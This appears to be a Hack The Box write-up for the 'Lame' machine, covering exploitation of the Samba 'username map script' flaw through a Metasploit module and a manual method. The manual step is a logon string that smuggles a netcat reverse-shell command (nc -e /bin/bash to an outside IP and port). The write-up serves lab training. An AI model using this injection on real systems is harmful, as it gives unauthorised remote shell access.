I"<p><strong>DIGEST</strong></p>

<p>An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It‚Äôs vulnerable to the ‚ÄúSamba username map script‚Äù vulnerability and exploited using both Manual and Metasploit module.</p>

<p><img src="../../../../img/htb/lame/lame.png" alt="lame" /></p>

<!--
<html>

<head>
    <style>
    b {
  font-weight: bold;
}
        table {
            font-family: arial, sans-serif;
            border-collapse: collapse;
            width: 100%;
        }

        td,
        th {
            border: 1px solid #050505;
            text-align: left;
            padding: 8px;
        }

        tr:nth-child(even) {
            background-color: #050505;
        }
    </style>
</head>

<body>
    <h2 class="text-center">Lame</h2>
           -->
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;
    &lt;table&gt;
        &lt;tbody&gt;
            &lt;tr&gt;
                &lt;td class="text-right"&gt;OS:&lt;/td&gt;
                &lt;td&gt;Linux&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class="text-right"&gt;Difficulty:&lt;/td&gt;
                &lt;td&gt; &lt;span class="text-success bold"&gt;Easy&lt;/span&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class="text-right"&gt;Points:&lt;/td&gt;
                &lt;td&gt;&lt;span class="text-success"&gt;20&lt;/span&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class="text-right"&gt;Release:&lt;/td&gt;
                &lt;td&gt;14 Mar 2017&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class="text-right"&gt;IP:&lt;/td&gt;
                &lt;td&gt;10.10.10.3&lt;/td&gt;
            &lt;/tr&gt;
        &lt;/tbody&gt;
    &lt;/table&gt;
&lt;/p&gt;
</code></pre></div></div>
<p>&lt;/body&gt;
&lt;/html&gt;</p>

<p><strong>Tools Used:</strong></p>

<blockquote>
  <p>Nmap, Searchsploit, Metsaploit</p>
</blockquote>

<p><strong>Initial Scan with Nmap:</strong></p>

<p><img src="../../../../img/htb/lame/lame-nmap.png" alt="lame-nm" /></p>

<p><img src="../../../../img/htb/lame/lame-nmap-result.png" alt="lame-nmap" /></p>

<p><strong>Vulnerable Samba service on port 139:</strong></p>

<p>This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default ‚Äúusername map script‚Äù configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p>

<p><strong>Searchsploit:</strong></p>

<blockquote>
  <p>$ searchsploit Samba 3.0.20</p>
</blockquote>

<p><img src="../../../../img/htb/lame/lame-sp.png" alt="Searchsploit" /></p>

<p><strong>MSF Module - Samba ‚Äúusername map script‚Äù Command Execution:</strong></p>

<blockquote>
  <p>$ msf&gt; use exploit/multi/samba/usermap_script</p>
</blockquote>

<p><img src="../../../../img/htb/lame/lame-msf.png" alt="msf" /></p>

<p><img src="../../../../img/htb/lame/lame-msf2.png" alt="shell" /></p>

<p><img src="../../../../img/htb/lame/lame-hash.png" alt="root" /></p>

<p><strong>Manual Exploitation:</strong></p>

<blockquote>
  <p>logon ‚Äú./=<code class="highlighter-rouge">nohup nc -e /bin/bash 10.10.14.18 4444</code>‚Äù</p>
</blockquote>

<p><img src="../../../../img/htb/lame/lame-manual1.png" alt="Manual" /></p>

<p><img src="../../../../img/htb/lame/lame-manual1.png" alt="Manualroot" /></p>

<p><strong>Rate Matrix:</strong></p>

<p><img src="../../../../img/htb/lame/lame-matrix.png" alt="matrix" /></p>

<h5><center>Thanks for reading ‚ù§Ô∏è! </center></h5>
<h5><center>Feel free to leave a comment üí¨ below.</center></h5>
:ET